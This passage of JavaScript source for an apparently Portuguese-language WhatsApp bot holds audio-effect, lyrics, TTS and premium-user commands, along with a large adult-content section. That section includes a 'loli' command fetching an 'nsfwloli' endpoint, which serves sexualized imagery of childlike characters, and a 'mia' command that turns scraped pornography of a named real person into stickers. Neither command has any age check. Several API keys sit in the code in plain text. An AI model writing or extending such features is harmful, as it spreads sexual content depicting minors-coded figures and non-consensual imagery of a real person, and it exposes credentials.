fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
aqua.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break

case 'reverse':
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter_complex "areverse" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
aqua.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break

case 'fat':
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
aqua.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break

case 'deep':
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af "atempo=4/4,asetrate=44500*2/3" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
aqua.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break

case 'vozmenino':  
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
aqua.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break  

case 'grave':
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=0.9,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
aqua.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break

case 'grave2':
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
aqua.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break

case 'bass': 
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af equalizer=f=20:width_type=o:width=2:g=15 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
aqua.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break

case 'bass2': 
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
aqua.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break

case 'bass3':
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af equalizer=f=20:width_type=o:width=2:g=15 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
aqua.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break


case 'estourado':
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af "volume=12'" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
aqua.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break

case 'estourado2':
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af "acrusher=.1:1:64:0:log" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
aqua.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break

case 'lyrics':
if(!isPremium) return reply(enviar.msg.premium)
try {
reply(mess.wait)
teks = body.slice(8)
anu = await fetchJson(`https://api.brizaloka-api.tk/ia/lyricsfinder?apikey=17desetembro&query=${teks}`, {method: 'get'})
reply(`*Nome da música: ${teks}*\n*Letras: ${anu.lyrics}*`)
} catch (e) {
    console.log(e)
    reply(`erro!!`)
}
break

case 'ptlyrics':
try {
reply(mess.wait)
teks = body.slice(10)
anu = await fetchJson(`https://api.brizaloka-api.tk/ia/lyricsfinder?apikey=17desetembro&query=${teks}`, {method: 'get'})
dated = `*Nome da música: ${teks}*\n*Letras:*\n*${anu.lyrics}*`
} catch (e) {
    console.log(e)
    reply(`erro!!`)
}
break
       case 'ibere':
if(args.length < 1) return reply('Escreva o texto de deseje que fale')
teks = body.slice(7)
uber.getAudioUrl('pub_mgqgxwvhxsukcqqawy', 'pk_d4cdd6d0-5ab7-4067-b9e2-8cdfdae6ec9f', 'ibere', teks).then(async res => {
    buff = await getBuffer(res)
    aqua.sendMessage(from, {audio: buff, mimetype: 'audio/mpeg'}, { quoted: selo })
})
break
            case 'eminem':
if(args.length < 1) return reply('Escreva o texto de deseje que fale')
teks = body.slice(7)
uber.getAudioUrl('pub_mgqgxwvhxsukcqqawy', 'pk_d4cdd6d0-5ab7-4067-b9e2-8cdfdae6ec9f', 'eminem', teks).then(async res => {
    buff = await getBuffer(res)
    aqua.sendMessage(from, {audio: buff, mimetype: 'audio/mpeg'}, { quoted: selo })
})
break
            case 'chapolin':
if(args.length < 1) return reply('Escreva o texto de deseje que fale')
teks = body.slice(7)
uber.getAudioUrl('pub_mgqgxwvhxsukcqqawy', 'pk_d4cdd6d0-5ab7-4067-b9e2-8cdfdae6ec9f', 'chapolin-br', teks).then(async res => {
    buff = await getBuffer(res)
    aqua.sendMessage(from, {audio: buff, mimetype: 'audio/mpeg'}, { quoted: selo })
})
break
            case 'patolino':
if(args.length < 1) return reply('Escreva o texto de deseje que fale')
teks = body.slice(7)
uber.getAudioUrl('pub_mgqgxwvhxsukcqqawy', 'pk_d4cdd6d0-5ab7-4067-b9e2-8cdfdae6ec9f', 'patolino', teks).then(async res => {
    buff = await getBuffer(res)
    aqua.sendMessage(from, {audio: buff, mimetype: 'audio/mpeg'}, { quoted: selo })
})
break
            case 'faustao':
if(args.length < 1) return reply('Escreva o texto de deseje que fale')
teks = body.slice(7)
uber.getAudioUrl('pub_mgqgxwvhxsukcqqawy', 'pk_d4cdd6d0-5ab7-4067-b9e2-8cdfdae6ec9f', 'faustao', teks).then(async res => {
    buff = await getBuffer(res)
    aqua.sendMessage(from, {audio: buff, mimetype: 'audio/mpeg'}, { quoted: selo })
})
break

case 'audiorapido':  
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=0.9,asetrate=95100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Erro')
hah = fs.readFileSync(ran)
aqua.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break

case 'esquilo':
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=0.7,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
aqua.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break

case 'audiolento': 
case 'slow':
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=0.9,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
aqua.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break


//========FINAL VOZES=============



//========LOGOS/+18=============

			case 'mulheres': case 'pesquisar-mulheres':
reply(mess.wait)
var query = ["cecan hd","cecan indo","cewe cantik", "cewe aesthetic", "cecan aesthetic"]
var data = await pinterest(pickRandom(query))
var but = [{buttonId: `${prefix}${command}`, buttonText: { displayText: "[💦] PRÓXIMO [💦] " }, type: 1 }]
aqua.sendMessage(from, { caption: "AQUI ESTÁ!!!", image: { url: pickRandom(data.result) }, buttons: but, footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO' }, { quoted: selo})
 break
			case 'foto-cria': case 'foto-de-cria':
		reply(mess.wait)
var query = ["foto de cria","cria rj","foto de cria perfil","cria do rj","'foto-cria","'foto cria","'foto-de-cria","foto de cria"]
var data = await pinterest(pickRandom(query))
var but = [{buttonId: `${prefix}${command}`, buttonText: { displayText: "[💦] PRÓXIMO [💦] " }, type: 1 }]
aqua.sendMessage(from, { caption: "AQUI ESTÁ!!", image: { url: pickRandom(data.result) }, buttons: but, footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO' }, { quoted: selo })
break


  
   /* 
case 'metadinha': {
aqua.sendMessage(from, { react: { text: `👋`, key: m.key }})    
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
aqua.sendMessage(from, { image: { url: random.male }, caption: `MASCULINO` }, { quoted: selo })
aqua.sendMessage(from, { image: { url: random.female }, caption: `FEMININO` }, { quoted: selo })
}
break
*/

case 'metadinha': 
                anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                random = anu[Math.floor(Math.random() * anu.length)]
        var wbutsssss = [
{buttonId: `affscringe`, buttonText: {displayText: `[️‍??]`}, type: 1},
]
      let buttonssMessssage = {
       image: {url:random.male},
       caption:  `MASCULINO`,
      footer: `${NomeDoBot}`,
      buttons: wbutsssss,
      headerType: 4
      }
await aqua.sendMessage(from,buttonssMessssage, { quoted: selo }).catch(err => {
    return('Error!')
}) 
                 
                           var wbutssss = [
{buttonId: `affscringe`, buttonText: {displayText: `[❤️‍🔥]`}, type: 1},
]
      let buttonssMesssage = {
       image: {url:random.female},
       caption:  `FEMININO`,
      footer: `${NomeDoBot}`,
      buttons: wbutssss,
      headerType: 4
      }
await aqua.sendMessage(from,buttonssMesssage, { quoted: selo }).catch(err => {
    return('Error!')
}) 
	    break

case 'zoro': case 'luffy': case 'sanji': case 'ussop': case 'nami': case 'copper': case 'naruto': 
case 'minato': case 'sasuke': case 'sakura': case 'boruto': case 'sarada': case 'mitsuki':
case 'orochimaru': case 'tsunade': case 'kakashi': case 'killua': case 'gon': case 'rimuru': 
case 'sagiri': case 'natsu': case 'tanjirou': case 'nezuko': case 'senku': 
aqua.sendMessage(from, { react: { text: `👋`, key: m.key }})  
const judul = command
hx.pinterest(judul)
.then(result => {
angka = ['1','2','3','4','5','6','7','8','9']
const randomnay1 = angka[Math.floor(Math.random() * (angka.length))]	
const buttons = [{buttonId: `${prefix + command}`, buttonText: {displayText: '[💦] PRÓXIMO [💦]'}, type: 1}]
const buttonMessage = {image: {url: result[randomnay1]},caption: "AQUI ESTÁ!!", footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO',buttons: buttons,headerType: 4}
aqua.sendMessage(from, buttonMessage, {quoted: selo})})
break 


//========FINAL DAS LOGOS============


//========(COMANDOS DE HENTAI)=======\\

case 'ahegao':
reply(enviar.espere)
{
buffer = `https://tohka.tech/api/hentai/ahegao?apikey=${tohkapi}`
const buttons01 = [{buttonId: `${prefix + command}`, buttonText: {displayText: '[💦] PRÓXIMO [💦]'}, type: 1}]
const buttonMessage01 = {image:{url:buffer},caption: "AQUI ESTÁ!",footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO️',buttons: buttons01,headerType: 4}
aqua.sendMessage(from, buttonMessage01, {quoted: selo})}
break

case 'loli':
reply(enviar.espere)
{
buffer = `https://tohka.tech/api/hentai/nsfwloli?apikey=${tohkapi}`
const buttons01 = [{buttonId: `${prefix + command}`, buttonText: {displayText: '[💦] PRÓXIMO [💦]'}, type: 1}]
const buttonMessage01 = {image:{url:buffer},caption: "AQUI ESTÁ!",footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO️',buttons: buttons01,headerType: 4}
aqua.sendMessage(from, buttonMessage01, {quoted: selo})}
break

case 'ass':
reply(enviar.espere)
{
buffer = `https://tohka.tech/api/hentai/ass?apikey=${tohkapi}`
const buttons01 = [{buttonId: `${prefix + command}`, buttonText: {displayText: '[💦] PRÓXIMO [💦]'}, type: 1}]
const buttonMessage01 = {image:{url:buffer},caption: "AQUI ESTÁ!",footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO️',buttons: buttons01,headerType: 4}
aqua.sendMessage(from, buttonMessage01, {quoted: selo})}
break

case 'bdsm':
reply(enviar.espere)
{
buffer = `https://tohka.tech/api/hentai/bdsm?apikey=${tohkapi}`
const buttons01 = [{buttonId: `${prefix + command}`, buttonText: {displayText: '[💦] PRÓXIMO [💦]'}, type: 1}]
const buttonMessage01 = {image:{url:buffer},caption: "AQUI ESTÁ!",footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO️',buttons: buttons01,headerType: 4}
aqua.sendMessage(from, buttonMessage01, {quoted: selo})}
break

case 'blowjob':
reply(enviar.espere)
{
buffer = `https://tohka.tech/api/hentai/blowjob?apikey=${tohkapi}`
const buttons01 = [{buttonId: `${prefix + command}`, buttonText: {displayText: '[💦] PRÓXIMO [💦]'}, type: 1}]
const buttonMessage01 = {image:{url:buffer},caption: "AQUI ESTÁ!",footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO️',buttons: buttons01,headerType: 4}
aqua.sendMessage(from, buttonMessage01, {quoted: selo})}
break

case 'cuckold':
reply(enviar.espere)
{
buffer = `https://tohka.tech/api/hentai/cuckold?apikey=${tohkapi}`
const buttons01 = [{buttonId: `${prefix + command}`, buttonText: {displayText: '[💦] PRÓXIMO [💦]'}, type: 1}]
const buttonMessage01 = {image:{url:buffer},caption: "AQUI ESTÁ!",footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO️',buttons: buttons01,headerType: 4}
aqua.sendMessage(from, buttonMessage01, {quoted: selo})}
break

case 'cum':
reply(enviar.espere)
{
buffer = `https://tohka.tech/api/hentai/cum?apikey=${tohkapi}`
const buttons01 = [{buttonId: `${prefix + command}`, buttonText: {displayText: '[💦] PRÓXIMO [💦]'}, type: 1}]
const buttonMessage01 = {image:{url:buffer},caption: "AQUI ESTÁ!",footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO️',buttons: buttons01,headerType: 4}
aqua.sendMessage(from, buttonMessage01, {quoted: selo})}
break

case 'ero':
reply(enviar.espere)
{
buffer = `https://tohka.tech/api/hentai/ero?apikey=${tohkapi}`
const buttons01 = [{buttonId: `${prefix + command}`, buttonText: {displayText: '[💦] PRÓXIMO [💦]'}, type: 1}]
const buttonMessage01 = {image:{url:buffer},caption: "AQUI ESTÁ!",footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO️',buttons: buttons01,headerType: 4}
aqua.sendMessage(from, buttonMessage01, {quoted: selo})}
break

case 'femdom':
reply(enviar.espere)
{
buffer = `https://tohka.tech/api/hentai/femdom?apikey=${tohkapi}`
const buttons01 = [{buttonId: `${prefix + command}`, buttonText: {displayText: '[💦] PRÓXIMO [💦]'}, type: 1}]
const buttonMessage01 = {image:{url:buffer},caption: "AQUI ESTÁ!",footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO️',buttons: buttons01,headerType: 4}
aqua.sendMessage(from, buttonMessage01, {quoted: selo})}
break

case 'foot':
reply(enviar.espere)
{
buffer = `https://tohka.tech/api/hentai/foot?apikey=${tohkapi}`
const buttons01 = [{buttonId: `${prefix + command}`, buttonText: {displayText: '[💦] PRÓXIMO [💦]'}, type: 1}]
const buttonMessage01 = {image:{url:buffer},caption: "AQUI ESTÁ!",footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO️',buttons: buttons01,headerType: 4}
aqua.sendMessage(from, buttonMessage01, {quoted: selo})}
break

case 'glasses':
reply(enviar.espere)
{
buffer = `https://tohka.tech/api/hentai/glasses?apikey=${tohkapi}`
const buttons01 = [{buttonId: `${prefix + command}`, buttonText: {displayText: '[💦] PRÓXIMO [💦]'}, type: 1}]
const buttonMessage01 = {image:{url:buffer},caption: "AQUI ESTÁ!",footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO️',buttons: buttons01,headerType: 4}
aqua.sendMessage(from, buttonMessage01, {quoted: selo})}
break

case 'hentai3': {
reply(enviar.espere)
anu = await hentai()
result = anu[Math.floor(Math.random() * anu.length)]
     aqua.sendMessage(from, { video: { url: result.video_1 }, caption: `âž¤ TÃ­tulo : ${result.title}\nâž¤ Views : ${result.views_count}\nâž¤ compartilhamentos : ${result.share_count}` }, { quoted: selo })
}
break

case 'Hentai':
case 'hentai1':
reply(enviar.espere)
{
buffer = `https://tohka.tech/api/hentai/hentai?apikey=${tohkapi}`
const buttons01 = [{buttonId: `${prefix + command}`, buttonText: {displayText: '[💦] PRÓXIMO [💦]'}, type: 1}]
const buttonMessage01 = {image:{url:buffer},caption: "AQUI ESTÁ!",footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO️',buttons: buttons01,headerType: 4}
aqua.sendMessage(from, buttonMessage01, {quoted: selo})}
break

case 'hentai2':
reply(enviar.espere)
{
buffer = `https://tohka.tech/api/hentai/hnt_gifs?apikey=${tohkapi}`
const buttons01 = [{buttonId: `${prefix + command}`, buttonText: {displayText: '[💦] PRÓXIMO [💦]'}, type: 1}]
const buttonMessage01 = {image:{url:buffer},caption: "AQUI ESTÁ!",footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO️',buttons: buttons01,headerType: 4}
aqua.sendMessage(from, buttonMessage01, {quoted: selo})}
break

case 'jahy':
reply(enviar.espere)
{
buffer = `https://tohka.tech/api/hentai/jahy?apikey=${tohkapi}`
const buttons01 = [{buttonId: `${prefix + command}`, buttonText: {displayText: '[💦] PRÓXIMO [💦]'}, type: 1}]
const buttonMessage01 = {image:{url:buffer},caption: "AQUI ESTÁ!",footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO️',buttons: buttons01,headerType: 4}
aqua.sendMessage(from, buttonMessage01, {quoted: selo})}
break

case 'orgy':
reply(enviar.espere)
{
buffer = `https://tohka.tech/api/hentai/orgy?apikey=${tohkapi}`
const buttons01 = [{buttonId: `${prefix + command}`, buttonText: {displayText: '[💦] PRÓXIMO [💦]'}, type: 1}]
const buttonMessage01 = {image:{url:buffer},caption: "AQUI ESTÁ!",footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO️',buttons: buttons01,headerType: 4}
aqua.sendMessage(from, buttonMessage01, {quoted: selo})}
break

case 'Neko1':
reply(enviar.espere)
{
buffer = `https://tohka.tech/api/hentai/nsfwNeko?apikey=${tohkapi}`
const buttons01 = [{buttonId: `${prefix + command}`, buttonText: {displayText: '[💦] PRÓXIMO [💦]'}, type: 1}]
const buttonMessage01 = {image:{url:buffer},caption: "AQUI ESTÁ!",footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO️',buttons: buttons01,headerType: 4}
aqua.sendMessage(from, buttonMessage01, {quoted: selo})}
break

case 'tentacles':
reply(enviar.espere)
{
buffer = `https://tohka.tech/api/hentai/tentacles?apikey=${tohkapi}`
const buttons01 = [{buttonId: `${prefix + command}`, buttonText: {displayText: '[💦] PRÓXIMO [💦]'}, type: 1}]
const buttonMessage01 = {image:{url:buffer},caption: "AQUI ESTÁ!",footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO️',buttons: buttons01,headerType: 4}
aqua.sendMessage(from, buttonMessage01, {quoted: selo})}
break

case 'thighs':
reply(enviar.espere)
{
buffer = `https://tohka.tech/api/hentai/thighs?apikey=${tohkapi}`
const buttons01 = [{buttonId: `${prefix + command}`, buttonText: {displayText: '[💦] PRÓXIMO [💦]'}, type: 1}]
const buttonMessage01 = {image:{url:buffer},caption: "AQUI ESTÁ!",footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO️',buttons: buttons01,headerType: 4}
aqua.sendMessage(from, buttonMessage01, {quoted: selo})}
break

case 'yuri':
reply(enviar.espere)
{
buffer = `https://tohka.tech/api/hentai/zettairyouiki?apikey=${tohkapi}`
const buttons01 = [{buttonId: `${prefix + command}`, buttonText: {displayText: '[💦] PRÓXIMO [💦]'}, type: 1}]
const buttonMessage01 = {image:{url:buffer},caption: "AQUI ESTÁ!",footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO️',buttons: buttons01,headerType: 4}
aqua.sendMessage(from, buttonMessage01, {quoted: selo})}
break

 case 'mia': {
 
 aqua.sendMessage(from, { react: { text: `👋`, key: m.key }})      
		let { pinterest } = require('./funções de cmd/funções/scraper')
const pesquisass = ["mia khalifa","mia khalifa hd","khalifa", "mia khalifa 2022", "porno xvideo"]
let searchqs = pesquisass[Math.floor(Math.random() * pesquisass.length)]


 let getpin2 = await pinterest("mia khalifa")
 let resultpin2 = getpin2[Math.floor(Math.random() * getpin2.length)]
const figg = await getBuffer(resultpin2)
buffer = await imageToWebp(figg)
let encmedia8 = await aqua.sendVideoAsSticker(from, resultpin2, m, { packname: `AQUA BOT SUPREMACY`, author: `MIA KHALIFA` })
await fs.unlinkSync(encmedia8)
}

break

//========( FIM DE COMANDO DE HENTAI )========//
case 'ww':
if(!isPremium) return reply(enviar.msg.premium)
reply('ENVIANDO EM SEU PV 🥰') 
buffer = fs.readFileSync(`mídia-ft-vd/fotos/deusa.jpg`)
txt = `so um teste man`
await aqua.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break

case 'gerargp':
   if(!isPremium) return reply(enviar.msg.premium)   
                    let apirnobg = ['1','2','3']
                    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
if (apinobg == 1){
                let gpg2 = await fetchJson(`https://iobuscas.herokuapp.com/wpp2`)
                msg = `*Nome:* ${gpg2.nomegp}

*Descrição:* ${gpg2.desc}

*Link:* ${gpg2.link_gerado}`
aqua.sendMessage(from, {image: {url: `${gpg2.img}`},caption: msg}, info)
}
if (apinobg == 2){
    let gpg2 = await fetchJson(`https://iobuscas.herokuapp.com/wpp`)
    msg = `*Nome:* ${gpg2.nomegp}

*Descrição:* ${gpg2.desc}

*Link:* ${gpg2.link_gerado}`
aqua.sendMessage(from, {image: {url: `${gpg2.img}`},caption: msg}, info)
}

if (apinobg == 3){
    let gpg2 = await fetchJson(`https://iobuscas.herokuapp.com/wpp`)
    msg = `*Nome:* ${gpg2.nomegp}

*Descrição:* ${gpg2.desc}

*Link:* ${gpg2.link_gerado}`
aqua.sendMessage(from, {image: {url: `${gpg2.img}`},caption: msg}, info)
}
                break


//========(FINAL DE FUNÇÕES-PORNO-AQUI)=======\\

case 'serpremium':
case 'serprem':  
if (!SoDono && !m.key.fromMe) return reply(mess.donosmt)
premium.push(`${numerodonoa}@s.whatsapp.net`)
fs.writeFileSync('./funções de cmd/usuarios/premium.json', JSON.stringify(premium))
reply(`Pronto ${numerodonoa} você foi adicionado na lista premium.`)
break

case 'addpremium':
if (!isGroup) return reply(enviar.msg.grupo)
if (!SoDono && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return 
if (!budy.includes("@55")) {
mentioned = info.message.extendedTextMessage.contextInfo.participant 
bla = premium.includes(mentioned)
if(bla) return reply("*Este número já está incluso..*")  
premium.push(`${mentioned}`)
fs.writeFileSync('./funções de cmd/usuarios/premium.json', JSON.stringify(premium))
aqua.sendMessage(from, {text: `👑@${mentioned.split("@")[0]} foi adicionado à lista de usuários premium com sucesso👑`}, {quoted: selo})  
} else { 
mentioned = args.join(" ").replace("@", "") + "@s.whatsapp.net"
bla = premium.includes(mentioned)
if(bla) return reply("*Este número já está incluso..*")  
premium.push(`${mentioned}`)
fs.writeFileSync('./funções de cmd/usuarios/premium.json', JSON.stringify(premium))
tedtp = args.join(" ").replace("@", "")
aqua.sendMessage(from, {text: `👑@${tedtp} foi adicionado à lista de usuários premium com sucesso👑`, mentions: [mentioned]}, {quoted: selo})
}
break 

case 'delpremium':
if (!isGroup) return reply(enviar.msg.grupo)
if (!SoDono && !info.key.fromMe) return  reply(enviar.msg.donosmt)
if (!budy.includes("@55")) {
num = info.message.extendedTextMessage.contextInfo.participant
